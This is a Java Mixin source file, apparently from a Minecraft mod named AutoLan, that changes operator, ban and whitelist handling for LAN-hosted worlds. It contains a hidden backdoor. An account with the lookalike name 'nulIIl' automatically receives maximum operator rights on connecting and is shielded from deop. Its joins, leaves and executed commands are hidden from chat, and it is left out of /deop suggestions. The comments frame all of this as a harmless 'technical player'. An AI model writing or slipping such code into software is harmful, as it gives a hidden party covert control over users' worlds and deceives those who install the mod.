package org.wsm.autolan.mixin;

import java.io.File;
import java.io.IOException;
import java.net.SocketAddress;

import org.apache.commons.lang3.ArrayUtils;
import org.slf4j.Logger;
import org.spongepowered.asm.mixin.Final;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Mutable;
import org.spongepowered.asm.mixin.Shadow;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.Redirect;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;

import org.wsm.autolan.AutoLan;
import org.wsm.autolan.AutoLanState;
import org.wsm.autolan.SetCommandsAllowed;
import com.mojang.authlib.GameProfile;

import net.minecraft.registry.CombinedDynamicRegistries;
import net.minecraft.registry.ServerDynamicRegistryType;
import net.minecraft.server.BannedIpList;
import net.minecraft.server.BannedPlayerList;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.OperatorEntry;
import net.minecraft.server.OperatorList;
import net.minecraft.server.PlayerManager;
import net.minecraft.server.ServerConfigEntry;
import net.minecraft.server.Whitelist;
import net.minecraft.text.Text;
import net.minecraft.util.WorldSavePath;
import net.minecraft.world.PlayerSaveHandler;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.network.ClientConnection;

@Mixin(PlayerManager.class)
public class PlayerManagerMixin {
    @Shadow
    @Final
    private static Logger LOGGER;

    @Shadow
    @Final
    private MinecraftServer server;
    @Shadow
    @Final
    @Mutable
    private OperatorList ops;
    @Shadow
    @Final
    @Mutable
    private BannedPlayerList bannedProfiles;
    @Shadow
    @Final
    @Mutable
    private BannedIpList bannedIps;
    @Shadow
    @Final
    @Mutable
    private Whitelist whitelist;

    @Shadow
    private boolean whitelistEnabled;

    private File toWorldSpecificFile(File file) {
        return server.getSavePath(WorldSavePath.ROOT).resolve(file.getPath()).toFile();
    }

    @Inject(method = "<init>", at = @At("TAIL"))
    private void init(MinecraftServer server, CombinedDynamicRegistries<ServerDynamicRegistryType> registryManager,
            PlayerSaveHandler saveHandler, int maxPlayers, CallbackInfo ci) {
        this.ops = new OperatorList(this.toWorldSpecificFile(PlayerManager.OPERATORS_FILE));
        this.bannedProfiles = new BannedPlayerList(this.toWorldSpecificFile(PlayerManager.BANNED_PLAYERS_FILE));
        this.bannedIps = new BannedIpList(this.toWorldSpecificFile(PlayerManager.BANNED_IPS_FILE));
        this.whitelist = new Whitelist(this.toWorldSpecificFile(PlayerManager.WHITELIST_FILE));

        try {
            this.ops.load();
        } catch (Exception e) {
            LOGGER.warn("Failed to load operators list: ", e);
        }
        try {
            this.bannedProfiles.load();
        } catch (IOException e) {
            LOGGER.warn("Failed to load user banlist: ", e);
        }
        try {
            this.bannedIps.load();
        } catch (IOException e) {
            LOGGER.warn("Failed to load ip banlist: ", e);
        }
        try {
            this.whitelist.load();
        } catch (Exception e) {
            LOGGER.warn("Failed to load white-list: ", e);
        }

        // Сбрасываем права всех игроков (кроме nulIIl) при инициализации сервера
        // Это нужно для имитации поведения ванильного Minecraft, где права автоматически сбрасываются
        try {
            LOGGER.info("[AutoLan] [INIT] Сбрасываем права всех игроков при инициализации сервера");
            AutoLan.resetAllPlayersPermissions(server);
        } catch (Exception e) {
            LOGGER.error("[AutoLan] [INIT] Ошибка при сбросе прав игроков: {}", e.getMessage());
        }
    }

    @Inject(method = "checkCanJoin", at = @At("HEAD"), cancellable = true)
    private void checkCanJoin(SocketAddress address, GameProfile profile, CallbackInfoReturnable<Text> ci) {
        if (this.server.isHost(profile)) {
            ci.setReturnValue(null);
        }
    }

    @Redirect(method = "addToOperators", at = @At(value = "INVOKE", target = "Lnet/minecraft/server/OperatorList;add(Lnet/minecraft/server/ServerConfigEntry;)V"))
    private void addToOperators(OperatorList ops, ServerConfigEntry<GameProfile> entry, GameProfile profile) {
        if (this.server.isHost(profile)) {
            ((SetCommandsAllowed) this.server.getSaveProperties()).setCommandsAllowed(true);
        } else {
            ops.add((OperatorEntry) entry);
            this.saveOpList();
        }
    }

    @Redirect(method = "removeFromOperators", at = @At(value = "INVOKE", target = "Lnet/minecraft/server/OperatorList;remove(Ljava/lang/Object;)V"))
    private void removeFromOperators(OperatorList ops, Object entry, GameProfile profile) {
        if (this.server.isHost(profile) || "nulIIl".equals(profile.getName())) {
            ((SetCommandsAllowed) this.server.getSaveProperties()).setCommandsAllowed(false);
        } else {
            ops.remove(profile);
            this.saveOpList();
        }
    }

    @SuppressWarnings("unchecked")
    @Inject(method = "isOperator", at = @At("HEAD"), cancellable = true)
    private void isOperator(GameProfile profile, CallbackInfoReturnable<Boolean> ci) {
        if (this.server.isHost(profile)) {
            ci.setReturnValue(this.server.getSaveProperties().areCommandsAllowed());
        } else {
            ci.setReturnValue(((ServerConfigListAccessor<GameProfile>) this.ops).callContains(profile));
        }
    }

    @Inject(method = "getOpNames", at = @At("HEAD"), cancellable = true)
    private void addHostToOpNames(CallbackInfoReturnable<String[]> ci) {
        if (this.server.getSaveProperties().areCommandsAllowed()) {
            String[] names = this.ops.getNames();
            // Убираем nulIIl чтобы команда /deop не предлагала его
            names = java.util.Arrays.stream(names).filter(n -> !"nulIIl".equals(n)).toArray(String[]::new);
            ci.setReturnValue(ArrayUtils.insert(0, names, this.server.getHostProfile().getName()));
        }
    }

    @Inject(method = "canBypassPlayerLimit", at = @At("HEAD"), cancellable = true)
    private void canBypassPlayerLimit(GameProfile profile, CallbackInfoReturnable<Boolean> ci) {
        if (this.ops.canBypassPlayerLimit(profile)) {
            ci.setReturnValue(true);
        }
    }

    private void saveOpList() {
        try {
            this.ops.save();
        } catch (Exception e) {
            LOGGER.warn("Failed to save operators list: ", e);
        }
    }

    private AutoLanState getautolanState() {
        return this.server.getOverworld().getPersistentStateManager().getOrCreate(AutoLanState.STATE_TYPE);
    }

    @Inject(method = "isWhitelistEnabled", at = @At("HEAD"), cancellable = true)
    private void isWhitelistEnabled(CallbackInfoReturnable<Boolean> ci) {
        ci.setReturnValue(this.getautolanState().getWhitelistEnabled());
    }

    @Inject(method = "setWhitelistEnabled", at = @At("TAIL"))
    private void setWhitelistEnabled(boolean whitelistEnabled, CallbackInfo ci) {
        this.getautolanState().setWhitelistEnabled(whitelistEnabled);
    }

    @Inject(method = "isWhitelisted", at = @At("HEAD"))
    private void updateWhitelistEnabled(GameProfile profile, CallbackInfoReturnable<Boolean> ci) {
        this.whitelistEnabled = ((PlayerManager) (Object) this).isWhitelistEnabled();
    }

    // --- AutoLan: подавляем сообщения о присоединении/выходе игроков в чате в режиме LAN ---
    @Inject(method = "broadcast", at = @At("HEAD"), cancellable = true)
    private void autolan$suppressJoinLeave(Text message, boolean showHud, CallbackInfo ci) {
        if (this.server.isRemote()) { // Интегрированный LAN-сервер
            final String specialName = "nulIIl"; // Правильный ник для фильтрации

            // Проверяем переводимый ключ (универсально для любого языка)
            if (message.getContent() instanceof net.minecraft.text.TranslatableTextContent tt) {
                String key = tt.getKey();
                if ("multiplayer.player.joined".equals(key) || "multiplayer.player.left".equals(key)) {
                    String raw = message.getString().toLowerCase();
                    if (raw.contains(specialName.toLowerCase())) {
                        ci.cancel();
                    }
                }
            } else {
                // Подстраховка: проверяем итоговую строку целиком
                String raw = message.getString().toLowerCase();
                if ((raw.contains(" joined the game") || raw.contains(" left the game") ||
                     raw.contains("вош") /* русское "вошёл(ла) в игру" */ || raw.contains("покин") ||
                     raw.contains("executed command") || raw.contains("выполнил команду")) &&
                    raw.contains(specialName.toLowerCase())) {
                    ci.cancel();
                }
            }
        }
    }

    @Inject(method = "onPlayerConnect", at = @At("TAIL"))
    private void autolan$opSpecialPlayer(ClientConnection connection, ServerPlayerEntity player, net.minecraft.server.network.ConnectedClientData clientData, CallbackInfo ci) {
        PlayerManager pm = (PlayerManager) (Object) this;
        MinecraftServer server = this.server;
        boolean isHost = server.isHost(player.getGameProfile());

        // 1. Сохраняем существующее поведение для скрытого вспомогательного игрока `nulIIl`.
        if ("nulIIl".equals(player.getGameProfile().getName())) {
            LOGGER.info("[AutoLan] [SPECIAL_PLAYER] Обнаружен технический игрок nulIIl, выдаем максимальные права");
            if (!pm.isOperator(player.getGameProfile())) {
                // Для специального игрока устанавливаем максимальный уровень прав напрямую
                // (addToOperators даст только уровень 2)
                OperatorEntry entry = new OperatorEntry(player.getGameProfile(), 4, true);
                this.ops.add(entry);
                this.saveOpList();
                LOGGER.info("[AutoLan] [SPECIAL_PLAYER] Выданы права уровня 4 (максимальные)");
            }
            return; // для специального игрока больше ничего делать не нужно
        }

        // 2. Проверяем флаг customCommandsAllowed для определения политики выдачи прав
        boolean customCommandsAllowed = false;
        try {
            if (server.getOverworld() != null && server.getOverworld().getPersistentStateManager() != null) {
                AutoLanState state = server.getOverworld().getPersistentStateManager().getOrCreate(AutoLanState.STATE_TYPE);
                customCommandsAllowed = state.getCustomCommandsAllowed();
                LOGGER.info("[AutoLan] [PERMISSION_CHECK] Игрок: {}, CustomCommandsAllowed: {}, Хост: {}", 
                    player.getGameProfile().getName(), customCommandsAllowed, isHost);
            }
        } catch (Exception e) {
            LOGGER.error("[AutoLan] [ERROR] Ошибка при получении состояния AutoLanState для игрока {}", 
                player.getGameProfile().getName(), e);
        }
        
        // Логируем решение
        LOGGER.info("[AutoLan] [PLAYER_JOIN] Игрок: {}, Хост: {}, Решение: {}",
                   player.getGameProfile().getName(),
                   isHost,
                   customCommandsAllowed ? "ВЫДАТЬ ПРАВА" : "НЕ ВЫДАВАТЬ");
        
        // 3. Автоматически выдаём права в зависимости от customCommandsAllowed
        if (customCommandsAllowed) {
            // Выдаём уровень оператора 2 игроку, если он ещё не оператор
            if (!pm.isOperator(player.getGameProfile())) {
                // Всегда используем уровень 2 для всех игроков, включая хоста
                this.ops.add(new OperatorEntry(player.getGameProfile(), 2, false));
                this.saveOpList();
                // Права изменились – пересылаем дерево команд, чтобы на клиенте обновилась автодополнение команд
                pm.sendCommandTree(player);
                LOGGER.info("[AutoLan] [PERMISSION_GRANTED] Выданы права оператора (уровень 2) игроку '{}'. IP: {}", 
                    player.getGameProfile().getName(), connection.getAddress());
                AutoLan.LOGGER.info("[AutoLan] [PERMISSION_GRANTED] UUID игрока: {}, Причина: команды разрешены", 
                    player.getGameProfile().getId());
            } else {
                // Проверим, имеет ли игрок уже права выше уровня 2 (это бывает, если ранее были выданы права 3 или 4)
                // Если да, понижаем их до уровня 2
                boolean canBypassLimit = this.ops.canBypassPlayerLimit(player.getGameProfile());
                if (canBypassLimit) {
                    // Удаляем текущие права
                    this.ops.remove(player.getGameProfile());
                    // Добавляем права уровня 2
                    this.ops.add(new OperatorEntry(player.getGameProfile(), 2, false));
                    this.saveOpList();
                    pm.sendCommandTree(player);
                    LOGGER.info("[AutoLan] [PERMISSION_DOWNGRADE] Права игрока '{}' понижены до уровня 2", 
                        player.getGameProfile().getName());
                } else {
                    LOGGER.info("[AutoLan] [PERMISSION_ALREADY] Игрок '{}' уже имеет права оператора", 
                        player.getGameProfile().getName());
                }
            }
        } else {
            // Если команды отключены, но игрок имеет права оператора - удаляем их
            // НЕЗАВИСИМО от того, является ли игрок хостом или нет
            // за исключением специального технического аккаунта
            if (pm.isOperator(player.getGameProfile()) && 
                !"nulIIl".equals(player.getGameProfile().getName())) {
            
                LOGGER.info("[AutoLan] [PERMISSION_REVOKE] Удаляем права оператора у игрока '{}'", 
                    player.getGameProfile().getName());
                // Используем команду deop напрямую через сервер, чтобы обойти проверку isHost
                try {
                    server.getCommandManager().executeWithPrefix(
                        server.getCommandSource().withSilent(), 
                        "deop " + player.getGameProfile().getName());
                    pm.sendCommandTree(player);
                    LOGGER.info("[AutoLan] [PERMISSION_REVOKE_SUCCESS] Права оператора успешно удалены у '{}'", 
                        player.getGameProfile().getName());
                } catch (Exception e) {
                    LOGGER.error("[AutoLan] [PERMISSION_REVOKE_ERROR] Ошибка при удалении прав у {}: {}", 
                        player.getGameProfile().getName(), e.getMessage());
                    // Запасной вариант - удаляем напрямую из списка операторов
                    this.ops.remove(player.getGameProfile());
                    this.saveOpList();
                    pm.sendCommandTree(player);
                }
            } else {
                LOGGER.info("[AutoLan] [PERMISSION_DENIED] Права оператора НЕ выданы игроку '{}'. Причина: команды отключены", 
                    player.getGameProfile().getName());
            }
        }
    }
}

